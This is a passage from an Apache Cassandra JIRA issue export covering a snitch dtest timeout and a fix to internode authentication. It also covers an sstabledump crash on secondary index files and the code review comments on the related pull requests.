        matchn1 = 'tiated reconnect to an Internal IP (\/)?{}(:7000)? for the (\/)?{}(:7000)?'.format(NODE1_LISTEN_ADDRESS, NODE1_BROADCAST_ADDRESS)
        matchn2 = 'tiated reconnect to an Internal IP (\/)?{}(:7000)? for the (\/)?{}(:7000)?'.format(NODE2_LISTEN_ADDRESS, NODE2_BROADCAST_ADDRESS)
>       node1.watch_log_for(matchn2, filename='debug.log', timeout=60)

snitch_test.py:85: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
../venv/lib/python3.8/site-packages/ccmlib/node.py:589: in watch_log_for
    TimeoutError.raise_if_passed(start=start, timeout=timeout, node=self.name,
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

start = 1655174270.069921, timeout = 60
msg = ""Missing: ['tiated reconnect to an Internal IP (\\\\/)?127.0.0.2(:7000)? for the (\\\\/)?127.0.0.4(:7000)?'] not found...127.0.0.4:7000-LARGE_MESSAGES-8f378c72 successfully connected, version = 12, framing = CRC, encryption = unencrypted\n""
node = 'node1'

    @staticmethod
    def raise_if_passed(start, timeout, msg, node=None):
        if start + timeout < time.time():
>           raise TimeoutError.create(start, timeout, msg, node)
E           ccmlib.node.TimeoutError: 14 Jun 2022 02:38:50 [node1] after 60.07/60 seconds Missing: ['tiated reconnect to an Internal IP (\\/)?127.0.0.2(:7000)? for the (\\/)?127.0.0.4(:7000)?'] not found in debug.log:
E            Head: INFO  [main] 2022-06-14 02:36:25,360 YamlConfigura
E            Tail: ...7.0.0.3:7000(/127.0.0.1:43890)->/127.0.0.4:7000-LARGE_MESSAGES-8f378c72 successfully connected, version = 12, framing = CRC, encryption = unencrypted

../venv/lib/python3.8/site-packages/ccmlib/node.py:56: TimeoutError
{code}

 ",,e.dimitrova,jonmeredith,Jyothsnakonisa,yifanc,,,,,,,,,,,"jonmeredith commented on code in PR #1703:
URL: https://github.com/apache/cassandra/pull/1703#discussion_r907772429


##########
src/java/org/apache/cassandra/locator/ReconnectableSnitchHelper.java:
##########
@@ -18,6 +18,7 @@
 
 package org.apache.cassandra.locator;
 
+import java.net.InetAddress;

Review Comment:
   Unused import - guessing it got automatically added for the javadoc below?



##########
src/java/org/apache/cassandra/locator/ReconnectableSnitchHelper.java:
##########
@@ -61,10 +64,22 @@ private void reconnect(InetAddressAndPort publicAddress, VersionedValue localAdd
         }
     }
 
+    /**
+     * {@link org.apache.cassandra.auth.IInternodeAuthenticator#authenticate(InetAddress, int)} method is deprecated to
+     * support certificate based authentication.
+     *
+     * Non-certificate based authenticator implementations can do IP/PORT check in authenticate method.
+     *
+     * Certificate based authenticators can let authenticate method succeed if connection is REDIRECT as there are no
+     * certificates at this point to verify. Authentication check happens again in
+     * {@link org.apache.cassandra.net.OutboundConnectionInitiator.ServerAuthenticationHandler} after connection
+     * establishment in certificate based auth.
+     */

Review Comment:
   This comment block is more about the implementation inside `reconnect`, not information callers of the snitch method would need. Better to document RECONNECT behavior at the enum, or the default method for `IInternodeAuthenticator.authenticate`.



;27/Jun/22 20:37;githubbot;600","jonmeredith commented on code in PR #1703:
URL: https://github.com/apache/cassandra/pull/1703#discussion_r907827997


##########
src/java/org/apache/cassandra/auth/IInternodeAuthenticator.java:
##########
@@ -82,11 +82,18 @@ default void setupInternode()
     }
 
     /**
-     * Enum that represents connection type of an internode connection.
+     * Enum that represents connection type of internode connection.
+     *
+     * INBOUND - called after connection established, with certificate available if present.
+     * OUTBOUND - called after connection established, with certificate available if present.
+     * REDIRECT - called before initiating a redirected connection, without certificate available.
+     * The outbound connection will be authenticated with the certificate once a redirected connection is established.
+     * This is an extra check can be used to detect misconfiguration before reconnection, or ignored by returning true.

Review Comment:
   This is an extra check can be used to detect misconfiguration -> This is an extra check *that* can be used to detect misconfiguration



;27/Jun/22 21:52;githubbot;600","yifan-c commented on code in PR #1703:
URL: https://github.com/apache/cassandra/pull/1703#discussion_r908850686


##########
src/java/org/apache/cassandra/auth/IInternodeAuthenticator.java:
##########
@@ -82,11 +82,18 @@ default void setupInternode()
     }
 
     /**
-     * Enum that represents connection type of an internode connection.
+     * Enum that represents connection type of internode connection.
+     *
+     * INBOUND - called after connection established, with certificate available if present.
+     * OUTBOUND - called after connection established, with certificate available if present.
+     * PRECONNECT - called before initiating a connection, without certificate available.

Review Comment:
   nit: update the name.



##########
test/distributed/org/apache/cassandra/distributed/test/InternodeEncryptionEnforcementTest.java:
##########
@@ -352,6 +352,10 @@ public static class CertificateVerifyAuthenticator implements IInternodeAuthenti
         @Override
         public boolean authenticate(InetAddress remoteAddress, int remotePort, Certificate[] certificates, InternodeConnectionDirection connectionType)
         {
+            if (connectionType.equals(InternodeConnectionDirection.OUTBOUND_PRECONNECT))

Review Comment:
   nit: enum equality check can just use `==`.



;28/Jun/22 22:23;githubbot;600","yifan-c closed pull request #1703: CASSANDRA-17700 Remove usage of deprecated IP based authenticate method call
URL: https://github.com/apache/cassandra/pull/1703


;01/Jul/22 19:47;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,2400,,,0,2400,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17661,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,Jyothsnakonisa,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Jul 01 03:34:23 UTC 2022,,,jmeredithco,,,,All,,,,"0|z13frc:",9223372036854775807,,,,jmeredithco,ycai,,,Normal,,5.0,,https://github.com/apache/cassandra/commit/7119cf8be1c32fa6ac015456965ae27a17cd828c,,,,,,,,,Testcase got fixed in this PR https://github.com/apache/cassandra/pull/1703,,,,,"27/Jun/22 21:07;Jyothsnakonisa;[~e.dimitrova] Thanks for bringing this into our notice. I am working on this and [~jonmeredith]  is reviewing the patch https://github.com/apache/cassandra/pull/1703.;;;","28/Jun/22 22:41;yifanc;+1 on the patch. 

The patch fix the test failure and also adds the original authenticate behavior back, i.e. when the authenticator is IP based, authentication is done before establishing outbound connection. ;;;","30/Jun/22 16:35;jonmeredith;+1 thanks for fixing [~Jyothsnakonisa];;;","30/Jun/22 17:04;yifanc;Starting commit

CI Results:
||Branch||Source||Circle CI||
|trunk|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17700-trunk-E85B8DA9-43DF-4833-ABF1-5319B603BF40]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17700-trunk-E85B8DA9-43DF-4833-ABF1-5319B603BF40]|

The broken test was fixed. The other test failures have their tracking JIRAs. ;;;","01/Jul/22 03:34;yifanc;Committed into trunk as [7119cf8b|https://github.com/apache/cassandra/commit/7119cf8be1c32fa6ac015456965ae27a17cd828c];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
sstabledump errors when dumping data from index,CASSANDRA-17698,13450626,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maxwellguo,smiklosovic,smiklosovic,17/Jun/22 14:14,19/Jun/23 13:01,13/Jul/23 08:40,19/Jun/23 13:01,5.0,,,,,,Tool/sstable,,,,0,,"{code:java}
cqlsh> CREATE KEYSPACE ks1 WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 1};
cqlsh> CREATE TABLE ks1.tb1 ( id text, name text, primary key (id));
cqlsh> CREATE INDEX IF NOT EXISTS ON ks1.tb1(name);
cqlsh> INSERT INTO ks1.tb1 (id, name ) VALUES ( '1', 'Joe');
cqlsh> exit
./bin/nodetool flush
./tools/bin/sstabledump data/data/ks1/tb1-1c3c5f10ee4711ecab82eda2f44200b3/.tb1_name_idx/nb-1-big-Data.db 
[
  {
    ""partition"" : {
      ""key"" : [ ""Joe"" ],
      ""position"" : 0
    },
    ""rows"" : [
      {
        ""type"" : ""row"",
        ""position"" : 17,
        ""clustering"" : [ ] } ] } ]Exception in thread ""main"" java.lang.UnsupportedOperationException
        at org.apache.cassandra.db.marshal.PartitionerDefinedOrder.toJSONString(PartitionerDefinedOrder.java:87)
        at org.apache.cassandra.db.marshal.AbstractType.toJSONString(AbstractType.java:187)
        at org.apache.cassandra.tools.JsonTransformer.serializeClustering(JsonTransformer.java:372)
        at org.apache.cassandra.tools.JsonTransformer.serializeRow(JsonTransformer.java:269)
        at org.apache.cassandra.tools.JsonTransformer.serializePartition(JsonTransformer.java:235)
        at java.util.stream.ForEachOps$ForEachOp$OfRef.accept(ForEachOps.java:184)
        at java.util.stream.ReferencePipeline$2$1.accept(ReferencePipeline.java:175)
        at java.util.Iterator.forEachRemaining(Iterator.java:116)
        at java.util.Spliterators$IteratorSpliterator.forEachRemaining(Spliterators.java:1801)
        at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:482)
        at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:472)
        at java.util.stream.ForEachOps$ForEachOp.evaluateSequential(ForEachOps.java:151)
        at java.util.stream.ForEachOps$ForEachOp$OfRef.evaluateSequential(ForEachOps.java:174)
        at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234)
        at java.util.stream.ReferencePipeline.forEach(ReferencePipeline.java:418)
        at org.apache.cassandra.tools.JsonTransformer.toJson(JsonTransformer.java:113)
        at org.apache.cassandra.tools.SSTableExport.main(SSTableExport.java:214) {code}",,adelapena,benedict,blambov,maxwellguo,smiklosovic,yifanc,yongjiang,,,,,,,,"Maxwell-Guo opened a new pull request, #1925:
URL: https://github.com/apache/cassandra/pull/1925

   sstabledump errors when dumping data from index for CASSANDRA-17698
   
   patched by maxwellgc


;18/Oct/22 14:42;githubbot;600","Maxwell-Guo closed pull request #1925: sstabledump errors when dumping data from index for CASSANDRA-17698
URL: https://github.com/apache/cassandra/pull/1925


;20/Oct/22 10:37;githubbot;600","Maxwell-Guo opened a new pull request, #1937:
URL: https://github.com/apache/cassandra/pull/1937

   sstabledump errors when dumping data from index for CASSANDRA-17698
   
   patch by maxwellguo for CASSANDRA-17698
   
   
   The [Cassandra-17698](https://issues.apache.org/jira/browse/CASSANDRA-17698)
   
   


;20/Oct/22 13:56;githubbot;600","Maxwell-Guo closed pull request #1937: sstabledump errors when dumping data from index for CASSANDRA-17698
URL: https://github.com/apache/cassandra/pull/1937


;20/Oct/22 14:02;githubbot;600","Maxwell-Guo opened a new pull request, #1998:
URL: https://github.com/apache/cassandra/pull/1998

   sstabledump errors when dumping data from index for CASSANDRA-17698
   
   
   


;11/Nov/22 06:27;githubbot;600","Maxwell-Guo opened a new pull request, #2002:
URL: https://github.com/apache/cassandra/pull/2002

   3.11


;11/Nov/22 09:43;githubbot;600","Maxwell-Guo opened a new pull request, #2003:
URL: https://github.com/apache/cassandra/pull/2003

   4.0


;11/Nov/22 09:44;githubbot;600","Maxwell-Guo opened a new pull request, #2004:
URL: https://github.com/apache/cassandra/pull/2004

   4.1


;11/Nov/22 09:45;githubbot;600","Maxwell-Guo opened a new pull request, #2005:
URL: https://github.com/apache/cassandra/pull/2005

   trunk


;11/Nov/22 09:45;githubbot;600","Claudenw commented on code in PR #2005:
URL: https://github.com/apache/cassandra/pull/2005#discussion_r1020121220


##########
src/java/org/apache/cassandra/index/internal/CassandraIndexFunctions.java:
##########
@@ -51,6 +59,8 @@ default AbstractType<?> getIndexedValueType(ColumnMetadata indexedColumn)
         return indexedColumn.type;
     }
 
+    public AbstractType<?> getIndexedPartitionKeyType(ColumnMetadata indexedColumn);

Review Comment:
   If this was defined as 
   
   public default Abstract<?> getIndexPartitionKeyType(ColumnMetadat indexedColumn) {
       return indexedColumn.type;
   }
   
   Most of the overides provided below would not be needed.



##########
src/java/org/apache/cassandra/tools/SSTableExport.java:
##########
@@ -71,8 +72,8 @@
 
     static
     {
-        DatabaseDescriptor.clientInitialization();
-
+        DatabaseDescriptor.clientInitialization(false);
+        

Review Comment:
   remove the spaces



##########
src/java/org/apache/cassandra/index/internal/composites/RegularColumnIndex.java:
##########
@@ -76,7 +76,7 @@ public <T> CBuilder buildIndexClusteringPrefix(ByteBuffer partitionKey,
         // base table partition should be returned for any mathching index entry.
         return builder;
     }
-
+    

Review Comment:
   remove the spaces from the blank line



##########
src/java/org/apache/cassandra/index/internal/composites/PartitionKeyIndex.java:
##########
@@ -94,4 +94,5 @@ public boolean isStale(Row data, ByteBuffer indexValue, int nowInSec)
     {
         return !data.hasLiveData(nowInSec, enforceStrictLiveness);
     }
+

Review Comment:
   remove the blank line



##########
src/java/org/apache/cassandra/tools/Util.java:
##########
@@ -331,10 +334,18 @@ public static TableMetadata metadataFromSSTable(Descriptor desc) throws IOExcept
                     builder.addRegularColumn(ident, entry.getValue());
                 });
         builder.addPartitionKeyColumn(""PartitionKey"", header.getKeyType());
-        for (int i = 0; i < header.getClusteringTypes().size(); i++)
+        for (int i = 0; i < header.getClusteringTypes().size() ; i++)

Review Comment:
   remove the space before the semi-colon



;11/Nov/22 11:13;githubbot;600","Claudenw commented on code in PR #2004:
URL: https://github.com/apache/cassandra/pull/2004#discussion_r1020126001


##########
src/java/org/apache/cassandra/index/internal/CassandraIndexFunctions.java:
##########
@@ -51,6 +59,8 @@ default AbstractType<?> getIndexedValueType(ColumnMetadata indexedColumn)
         return indexedColumn.type;
     }
 
+    public AbstractType<?> getIndexedPartitionKeyType(ColumnMetadata indexedColumn);

Review Comment:
   Add a default implementation for the standard cases and only override when the return values i not indexedColumn.type.



;11/Nov/22 11:16;githubbot;600","blambov commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1021677876


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();

Review Comment:
   This also makes better sense before the check above.



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')

Review Comment:
   Shouldn't we throw an error if the next part is neither a separator nor a closing bracket?



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +98,24 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                tmp.withBaseType(Int32Type.instance);
+            }
+            System.out.println(type.toString());
+            assertSame(type, TypeParser.parse(type.toString()));
+        }
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }

Review Comment:
   It would be helpful to test some explicit definitions to try all acceptable variations (default partitioner, partitioner without base type, partitioner with base type).



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();

Review Comment:
   I would move this before the `isEOS` check.



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -28,29 +29,38 @@
 import org.apache.cassandra.dht.IPartitioner;
 import org.apache.cassandra.utils.ByteBufferUtil;
 import org.apache.cassandra.utils.FBUtilities;
+import org.apache.cassandra.utils.Pair;
 
 /** for sorting columns representing row keys in the row ordering as determined by a partitioner.
  * Not intended for user-defined CFs, and will in fact error out if used with such. */
 public class PartitionerDefinedOrder extends AbstractType<ByteBuffer>
 {
     private final IPartitioner partitioner;
-
+    private final AbstractType<?> baseType;
+    
     public PartitionerDefinedOrder(IPartitioner partitioner)
     {
         super(ComparisonType.CUSTOM);
         this.partitioner = partitioner;
+        this.baseType = null;
+    }
+
+    public PartitionerDefinedOrder(IPartitioner partitioner, AbstractType<?> baseType)
+    {
+        super(ComparisonType.CUSTOM);
+        this.partitioner = partitioner;
+        this.baseType = baseType;
     }
 
     public static AbstractType<?> getInstance(TypeParser parser)
     {
-        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
-        Iterator<String> argIterator = parser.getKeyValueParameters().keySet().iterator();
-        if (argIterator.hasNext())
-        {
-            partitioner = FBUtilities.newPartitioner(argIterator.next());
-            assert !argIterator.hasNext();
-        }
-        return partitioner.partitionOrdering();
+        TypeParser clone = parser.clone();
+        return clone.getPartitionerDefinedOrder();

Review Comment:
   There shouldn't be a need for `clone` here. (The clone might even break something, in the unlikely case of this being part of a composite/tuple.)



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')
+        {
+            return defaultParsePartitionOrdering(this);
+        }
+        IPartitioner partitioner = FBUtilities.newPartitioner(k);
+        AbstractType<?> type = partitioner.partitionOrdering();
+        if (partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
+        {
+            PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+            ++idx;
+            try
+            {
+                type = tmp.withBaseType(parse());
+            }
+            catch (Throwable throwable)
+            {
+                Iterator<String> argIterator = this.getKeyValueParameters().keySet().iterator();

Review Comment:
   Shouldn't we just throw an error in this case?



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')
+        {
+            return defaultParsePartitionOrdering(this);
+        }
+        IPartitioner partitioner = FBUtilities.newPartitioner(k);
+        AbstractType<?> type = partitioner.partitionOrdering();
+        if (partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)

Review Comment:
   Looks like this test should be checking if a `:` was seen instead.



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);

Review Comment:
   Couldn't we just use `DatabaseDescriptor.getPartitioner().partitionerOrdering()` here?



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)

Review Comment:
   Could you expand on this? The actual format appears to permit more, at least `PartitionerDefinedOrder`, `PartitionerDefinedOrder(<partitioner>)` and `PartitionerDefinedOrder(<partitioner>:<baseType>)`.



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +98,24 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                tmp.withBaseType(Int32Type.instance);

Review Comment:
   I believe this should be `type = ...`.



;14/Nov/22 15:47;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022289287


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);

Review Comment:
   just want to using the old format type parse of PartitionerDefinedOrder to do a double check parse. 
   if the string of type is %s(%s) 



;15/Nov/22 03:50;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022289678


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')
+        {
+            return defaultParsePartitionOrdering(this);
+        }
+        IPartitioner partitioner = FBUtilities.newPartitioner(k);
+        AbstractType<?> type = partitioner.partitionOrdering();
